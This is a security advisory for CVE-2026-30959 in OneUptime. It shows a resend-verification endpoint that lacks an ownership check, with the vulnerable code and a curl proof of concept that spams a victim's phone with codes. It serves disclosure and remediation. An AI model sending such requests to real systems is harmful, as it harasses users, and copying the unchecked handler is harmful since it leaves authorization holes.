# [M] OneUptime has WhatsApp Resend Verification Authorization Bypass

## Summary
Severity: Medium
Advisory: GHSA-cw6x-mw64-q6pv
CVE: CVE-2026-30959
CWE: CWE-285, CWE-307, CWE-639, CWE-862
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:L (CVSS_V4)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-cw6x-mw64-q6pv
Type: github-advisory

## Affected
- npm: `@oneuptime/common` — affected >=0 <10.0.21

## Details
### Description  
  The resend-verification-code endpoint allows any authenticated user to trigger a verification code resend for any `UserWhatsApp` record by ID. Ownership is not validated (unlike the verify endpoint).

### Affected Source  
- Endpoint: [UserWhatsAppAPI.ts](https://github.com/OneUptime/oneuptime/Common/Server/API/UserWhatsAppAPI.ts#L129-L153)  
- Service: [UserWhatsAppService.ts](https://github.com/OneUptime/oneuptime/Common/Server/API/UserWhatsAppAPI.ts#L129-L153)  
- Verify ownership (present in verify endpoint for comparison): [UserWhatsAppAPI.ts](https://github.com/OneUptime/oneuptime/Common/Server/API/UserWhatsAppAPI.ts#L78-L87)


### Full Code Lines (UserWhatsAppAPI.ts)

Resend path (authorization gap):

```ts
    this.router.post(
      `${new this.entityType()
        .getCrudApiPath()
        ?.toString()}/resend-verification-code`,
      UserMiddleware.getUserMiddleware,
      async (req: ExpressRequest, res: ExpressResponse, next: NextFunction) => {
        try {
          req = req as OneUptimeRequest;

          if (!req.body.itemId) {
            return Response.sendErrorResponse(
              req,
              res,
              new BadDataException("Invalid item ID"),
            );
          }

          await this.service.resendVerificationCode(req.body.itemId);

          return Response.sendEmptySuccessResponse(req, res);
        } catch (err) {
          return next(err);
        }
      },
    );
```

Verify path (ownership check present):

```ts
          if (
            item.userId?.toString() !==
            (req as OneUptimeRequest)?.userAuthorization?.userId?.toString()
          ) {
            return Response.sendErrorResponse(
              req,
              res,
              new BadDataException("Invalid user ID"),
            );
          }
```

## Prerequisites
- Valid attacker account with access to a project
- Attacker access token
- A victim’s `UserWhatsApp` itemId belonging to the same project

## Steps to Reproduce
1. Set your attacker token:

   ```bash
   export ATK="Bearer <attacker-access-token>"
   ```

2. Trigger resend for the victim’s item:

   ```bash
   curl -s -X POST \
     -H "Content-Type: application/json" \
     -H "Authorization: $ATK" \
     -d '{"itemId":"<victim-userwhatsapp-id>"}' \
     http://<host>/api/user-whats-app/resend-verification-code
   ```

## Expected/Observed Behavior
- HTTP 200 with `{}` body and a new verification code sent to the victim’s phone
- No checks confirm that `item.userId` equals the authenticated user’s ID for the resend path

## Impact
- Spam/DoS against victims’ phone numbers, social engineering pressure, and potential lockout flows due to repeated resends

## Recommended Fix
- Enforce ownership: `item.userId` must match the authenticated user
- Add per-item and per-user rate limiting for resends

## References
- https://github.com/OneUptime/oneuptime/security/advisories/GHSA-cw6x-mw64-q6pv
- https://nvd.nist.gov/vuln/detail/CVE-2026-30959
- https://github.com/OneUptime/oneuptime
- https://github.com/OneUptime/oneuptime/releases/tag/10.0.21
